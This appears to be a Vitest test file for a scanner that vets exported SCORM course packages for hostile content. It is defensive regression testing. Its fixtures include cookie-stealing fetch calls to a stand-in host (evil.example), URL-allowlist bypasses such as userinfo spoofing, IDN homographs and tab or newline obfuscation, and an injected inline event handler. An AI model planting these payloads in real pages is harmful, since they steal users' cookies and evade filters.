import { describe, it, expect } from "vitest";
import { scanPackage, ScanContext } from "@/lib/export/scanner";
import { buildManifestXml } from "@/lib/scorm/manifest";
import { createHash } from "node:crypto";

const sha256 = (b: Buffer | string) => createHash("sha256").update(b).digest("hex");

const ENGINE_JS = Buffer.from("window.ILBEngine={mount:function(){}};");
const ENGINE_CSS = Buffer.from(".ilb-sandbox{}");
const SCORM_JS = Buffer.from("window.ILBScorm={mode:'standalone'};");

const goodConfig = {
  title: "T",
  inputs: [{ id: "x", label: "x", type: "slider", min: 0, max: 10, step: 1, defaultValue: 5 }],
  outputs: [{ id: "y", label: "y", formula: "x * 2" }],
  charts: [], challenges: [],
};

function ctx(overrides: Partial<ScanContext> = {}): ScanContext {
  return {
    engineChecksums: { "engine/engine.js": sha256(ENGINE_JS), "engine/engine.css": sha256(ENGINE_CSS), "engine/scorm-adapter.js": sha256(SCORM_JS) },
    urlAllowlist: [],
    authoringConfig: goodConfig,
    ...overrides,
  };
}

function goodPackage(): Map<string, Buffer> {
  return new Map<string, Buffer>([
    ["imsmanifest.xml", Buffer.from('<?xml version="1.0"?><manifest></manifest>')],
    ["index.html", Buffer.from('<!DOCTYPE html><html><head><link rel="stylesheet" href="engine/engine.css" /></head><body><script src="engine/engine.js"></script></body></html>')],
    ["engine/engine.js", ENGINE_JS],
    ["engine/engine.css", ENGINE_CSS],
    ["engine/scorm-adapter.js", SCORM_JS],
    ["content/config.json", Buffer.from(JSON.stringify({ ...goodConfig }))],
  ]);
}

describe("scanPackage", () => {
  it("passes a clean package", () => {
    const r = scanPackage(goodPackage(), ctx());
    expect(r.violations).toEqual([]);
    expect(r.passed).toBe(true);
  });

  it("blocks eval and new Function in any text file", () => {
    const p = goodPackage();
    p.set("content/config.json", Buffer.from(JSON.stringify({ ...goodConfig, title: 'x", eval(1), "' })));
    const r1 = scanPackage(p, ctx({ authoringConfig: JSON.parse(p.get("content/config.json")!.toString()) }));
    expect(r1.passed).toBe(false);
    expect(r1.violations.some((v) => v.rule === "forbidden-pattern" && /eval/.test(v.detail))).toBe(true);
  });

  it("blocks inline event handlers and javascript: urls in html", () => {
    const p = goodPackage();
    p.set("index.html", Buffer.from('<html><body onload="x()"><a href="javascript:alert(1)">x</a></body></html>'));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.filter((v) => v.rule === "forbidden-pattern").length).toBeGreaterThanOrEqual(2);
  });

  it("blocks off-allowlist URLs but allows allowlisted ones", () => {
    const p = goodPackage();
    p.set("content/config.json", Buffer.from(JSON.stringify({ ...goodConfig, intro: '<a href="https://evil.example/x">x</a>' })));
    const cfg = JSON.parse(p.get("content/config.json")!.toString());
    expect(scanPackage(p, ctx({ authoringConfig: cfg })).passed).toBe(false);
    expect(scanPackage(p, ctx({ authoringConfig: cfg, urlAllowlist: ["evil.example"] })).passed).toBe(true);
  });

  it("blocks tampered engine files (checksum mismatch)", () => {
    const p = goodPackage();
    p.set("engine/engine.js", Buffer.from("window.ILBEngine={mount:function(){}};//tampered"));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "checksum-mismatch")).toBe(true);
  });

  it("blocks unexpected file types", () => {
    const p = goodPackage();
    p.set("assets/evil.exe", Buffer.from("MZ"));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "file-type" && v.file === "assets/evil.exe")).toBe(true);
  });

  it("blocks iframes and external script srcs", () => {
    const p = goodPackage();
    p.set("index.html", Buffer.from('<html><body><iframe src="x.html"></iframe><script src="https://cdn.example/x.js"></script></body></html>'));
    const r = scanPackage(p, ctx());
    expect(r.violations.some((v) => /iframe/i.test(v.detail))).toBe(true);
  });

  it("blocks configs that fail schema revalidation", () => {
    const p = goodPackage();
    const bad = { ...goodConfig, outputs: [{ id: "y", label: "y", formula: "fetch(1)" }] };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "schema")).toBe(true);
  });

  it("blocks non-idempotent rich text (sanitizer disagreement)", () => {
    const p = goodPackage();
    const bad = { ...goodConfig, intro: '<p onclick="x()">hi</p>' };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
  });

  // --- Security-review regression tests (bypasses C1/C2/C3/I1/I2 + index.html
  // audited-reference check + empty-engineChecksums) ---

  it("C1: blocks uppercase-scheme URLs (HTTPS://) that a case-sensitive regex would miss", () => {
    const p = goodPackage();
    const bad = { ...goodConfig, title: "HTTPS://evil.com" };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.com/i.test(v.detail))).toBe(true);
  });

  it("C2: blocks IDN/non-ASCII-host URLs that an ASCII-only host regex would never match at all", () => {
    const p = goodPackage();
    // "а" is Cyrillic "а" (U+0430), not Latin "a" (U+0061) — an
    // ASCII-only capture group fails to match immediately after "://",
    // which previously caused the ENTIRE url-allowlist rule to find zero
    // matches for this text (not merely mis-extract the host).
    const bad = { ...goodConfig, title: "https://аpple.com" };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" || v.rule === "invalid-url")).toBe(true);
  });

  it("C3: blocks userinfo-spoofed URLs using the real resolved hostname, not the userinfo", () => {
    const p = goodPackage();
    // Looks like "allowed.com" but the userinfo (before @) is not the host —
    // url.hostname correctly resolves this to "evil.com".
    const bad = { ...goodConfig, title: "https://allowed.com@evil.com/" };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["allowed.com"] }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.com/i.test(v.detail))).toBe(true);
  });

  it("I1: blocks a stray non-checksummed .js file regardless of its content (only audited code may execute)", () => {
    const p = goodPackage();
    p.set("content/tracker.js", Buffer.from("fetch('https://evil.example/collect?c='+document.cookie)"));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "content/tracker.js")).toBe(true);
  });

  it("I2: blocks a (stray) .css file with a protocol-relative @import", () => {
    const p = goodPackage();
    p.set("content/x.css", Buffer.from("@import url(//evil.com/x.css);"));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "content/x.css")).toBe(true);
    expect(r.violations.some((v) => v.rule === "forbidden-pattern" && /protocol-relative/i.test(v.detail))).toBe(true);
  });

  it("blocks index.html referencing a non-checksummed script path (audited-reference rule)", () => {
    const p = goodPackage();
    p.set("index.html", Buffer.from('<html><body><script src="content/tracker.js"></script></body></html>'));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "index.html")).toBe(true);
  });

  it("blocks an empty (or shrunk) engineChecksums that omits required engine keys", () => {
    const r = scanPackage(goodPackage(), ctx({ engineChecksums: {} }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "missing-engine-checksum")).toBe(true);
  });

  // --- Re-attack regression tests (N1/N2/N3 whitespace/JSON-escape URL
  // bypass, N4 index.html-is-the-audited-launcher) ---

  it("N1: blocks a tab-obfuscated URL in intro (allowlist=[youtube.com], real host is evil.example)", () => {
    const p = goodPackage();
    const tab = String.fromCharCode(9);
    const bad = { ...goodConfig, intro: `<a href="https://youtube.com${tab}@evil.example/x">c</a>` };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["youtube.com"] }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
  });

  it("N2: blocks the same bypass using a newline instead of a tab", () => {
    const p = goodPackage();
    const nl = String.fromCharCode(10);
    const bad = { ...goodConfig, intro: `<a href="https://youtube.com${nl}@evil.example/x">c</a>` };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["youtube.com"] }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
  });

  it("N3: blocks a tab+dot subdomain-look-alike variant (youtube.com<TAB>.evil.example)", () => {
    const p = goodPackage();
    const tab = String.fromCharCode(9);
    const bad = { ...goodConfig, intro: `<a href="https://youtube.com${tab}.evil.example/x">c</a>` };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["youtube.com"] }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && /youtube\.com\.evil\.example/i.test(v.detail))).toBe(true);
  });

  it("control: the tab-obfuscated URL is still blocked under the default empty allowlist", () => {
    const p = goodPackage();
    const tab = String.fromCharCode(9);
    const bad = { ...goodConfig, intro: `<a href="https://youtube.com${tab}@evil.example/x">c</a>` };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist")).toBe(true);
  });

  it("N4: a legitimate index.html passes when supplied byte-exact as expectedIndexHtml", () => {
    const p = goodPackage();
    const exact = p.get("index.html")!;
    const r = scanPackage(p, ctx({ expectedIndexHtml: exact }));
    expect(r.passed).toBe(true);
  });

  it("N4: rejects index.html that doesn't byte-match expectedIndexHtml", () => {
    const p = goodPackage();
    const expected = Buffer.from("<!DOCTYPE html><html><head></head><body>a different launcher</body></html>");
    const r = scanPackage(p, ctx({ expectedIndexHtml: expected }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "index-html-mismatch" && v.file === "index.html")).toBe(true);
  });

  it("N4: fallback mode (no expectedIndexHtml) blocks an added inline exfil <script> in index.html", () => {
    const p = goodPackage();
    p.set("index.html", Buffer.from(
      '<html><body><script src="engine/engine.js"></script>' +
      '<script>fetch("https://evil.example/collect?c=" + document.cookie)</script></body></html>'
    ));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
  });

  it("N4: fallback mode is not fooled by a decoy data-src attribute on an inline exfil <script>", () => {
    // A `data-src` attribute is not a real `src` — browsers still execute
    // this script inline. A `\b`-based "does this have a src" check would
    // wrongly treat "data-src=" as satisfying "has src" and skip it.
    const p = goodPackage();
    p.set("index.html", Buffer.from(
      '<html><body><script src="engine/engine.js"></script>' +
      '<script data-src="decoy">fetch("https://evil.example/collect?c=" + document.cookie)</script></body></html>'
    ));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
  });

  // --- Second re-attack: fallback inline-script decoy hardening +
  // per-token URL whitespace handling ---

  it("N4: fallback mode is not fooled by a src-lookalike hiding inside ANOTHER attribute's quoted value", () => {
    // data-x=" src=y" contains the literal substring ' src=' inside a
    // DIFFERENT attribute's value. A regex can't tell it's not a real src
    // attribute on the tag — which is exactly why the fix drops the
    // "does this tag have src" exception entirely rather than trying to
    // out-regex the next decoy shape.
    const p = goodPackage();
    p.set("index.html", Buffer.from(
      '<html><body><script src="engine/engine.js"></script>' +
      '<script data-x=" src=y">fetch("https://evil.example/collect?c=" + document.cookie)</script></body></html>'
    ));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
  });

  it("N4: fallback mode catches an inline script even with an uppercase <SCRIPT> tag", () => {
    const p = goodPackage();
    p.set("index.html", Buffer.from(
      '<html><body><script src="engine/engine.js"></script>' +
      '<SCRIPT>fetch("https://evil.example/collect?c=" + document.cookie)</SCRIPT></body></html>'
    ));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
  });

  it("N4: fallback mode does NOT flag a legitimate empty-body external script tag by itself", () => {
    // goodPackage()'s index.html is exactly <script src="engine/engine.js"></script>
    // with an empty body — this alone must never trip "inline-script".
    const r = scanPackage(goodPackage(), ctx());
    expect(r.violations.some((v) => v.rule === "inline-script")).toBe(false);
  });

  it("robustness: the per-file text scan catches word<TAB>https://evil.com (raw bytes, not JSON-round-tripped)", () => {
    // Previously, stripUrlWhitespace ran over the WHOLE text before
    // tokenizing, so "word\thttps://evil.com" collapsed to
    // "wordhttps://evil.com" and the \b boundary before "https" then
    // failed to match at all -- a false negative. The tokenizer must now
    // run on the raw (unstripped) text so the boundary survives.
    //
    // Written directly into a text file's raw bytes rather than through
    // JSON.stringify: JSON-escaping a real tab produces the two-character
    // sequence \t, whose second character ('t') is itself a word
    // character directly touching "https" -- a different, JSON-specific
    // artifact (see N1/N2/N3) that would mask what this test is actually
    // isolating: the tokenizer's own boundary handling on raw text.
    const p = goodPackage();
    const tab = String.fromCharCode(9);
    p.set("index.html", Buffer.from(
      `<html><body><script src="engine/engine.js"></script><!-- word${tab}https://evil.example/x --></body></html>`
    ));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
  });

  it("robustness: N1/N2/N3 (tab/newline-obfuscated URL bypass) are still caught after the per-token stripping change", () => {
    const p = goodPackage();
    const tab = String.fromCharCode(9);
    const nl = String.fromCharCode(10);
    const badTab = { ...goodConfig, intro: `<a href="https://youtube.com${tab}@evil.example/x">c</a>` };
    p.set("content/config.json", Buffer.from(JSON.stringify(badTab)));
    const rTab = scanPackage(p, ctx({ authoringConfig: badTab, urlAllowlist: ["youtube.com"] }));
    expect(rTab.passed).toBe(false);
    expect(rTab.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);

    const badNl = { ...goodConfig, intro: `<a href="https://youtube.com${nl}@evil.example/x">c</a>` };
    const p2 = goodPackage();
    p2.set("content/config.json", Buffer.from(JSON.stringify(badNl)));
    const rNl = scanPackage(p2, ctx({ authoringConfig: badNl, urlAllowlist: ["youtube.com"] }));
    expect(rNl.passed).toBe(false);
    expect(rNl.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
  });

  // --- Task 13 wiring surfaced a real bug: buildManifestXml's mandatory
  // SCORM 1.2 / IMS CP xmlns + schemaLocation URIs are spec boilerplate,
  // not attacker-influenced content, but they're still http(s) URLs that
  // the url-allowlist rule scans -- so with the strict empty-default
  // allowlist EVERY real export failed. scanner.test.ts's goodPackage()
  // uses a stub <manifest></manifest> with none of these URIs, which is
  // why this never surfaced until a real buildManifestXml output was
  // scanned. ---

  it("a real buildManifestXml output scans clean with the default empty allowlist (its namespace URIs are exempt)", () => {
    const manifestXml = buildManifestXml({
      identifier: "ILB-test1",
      title: "T",
      files: ["content/config.json", "engine/engine.css", "engine/engine.js", "engine/scorm-adapter.js", "index.html"],
    });
    const p = goodPackage();
    p.set("imsmanifest.xml", Buffer.from(manifestXml));
    const r = scanPackage(p, ctx());
    expect(r.violations.filter((v) => v.rule === "url-allowlist")).toEqual([]);
    expect(r.passed).toBe(true);
  });

  it("CRITICAL: an attacker-controlled title in the manifest is still caught, even though the manifest's own namespace URIs are exempt", () => {
    const manifestXml = buildManifestXml({
      identifier: "ILB-test1",
      title: "https://evil.com",
      files: ["index.html"],
    });
    const p = goodPackage();
    p.set("imsmanifest.xml", Buffer.from(manifestXml));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) =>
      v.rule === "url-allowlist" && v.file === "imsmanifest.xml" && /evil\.com/i.test(v.detail)
    )).toBe(true);
  });

  it("catches a quote-escaped inline-handler substring that only reads as JSON-escaped (backslash-quote) in the serialized file, via the decoded-value walk", () => {
    // JSON.stringify escapes the embedded `"` as `\"` in content/config.json's
    // actual bytes, e.g. `...onmouseover=\"alert(1)...` — the quoted-
    // attribute-form regex in FORBIDDEN_PATTERNS requires a REAL quote
    // character immediately after "=" (by design, to avoid false positives
    // on unrelated JSON text), so it does NOT match a backslash sitting in
    // that position. Only walking the DECODED string value (the real
    // authored `kg" onmouseover="alert(1)` with its real quote character,
    // exactly what JSON.parse hands back) catches this.
    const p = goodPackage();
    const bad = { ...goodConfig, outputs: [{ id: "y", label: "y", units: 'kg" onmouseover="alert(1)' }] };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const authoringConfig = JSON.parse(p.get("content/config.json")!.toString());
    const r = scanPackage(p, ctx({ authoringConfig }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) =>
      v.rule === "forbidden-pattern" && v.file === "content/config.json" && /inline event handler/i.test(v.detail)
    )).toBe(true);
  });

  it("the manifest-namespace exemption does not apply outside imsmanifest.xml (exact-URL-in-wrong-file is still caught)", () => {
    // Same exact string as one of the exempt namespace URIs, but placed in
    // content/config.json instead -- must NOT be exempt there.
    const p = goodPackage();
    const bad = { ...goodConfig, title: "http://www.imsproject.org/xsd/imscp_rootv1p1p2" };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && v.file === "content/config.json")).toBe(true);
  });
});
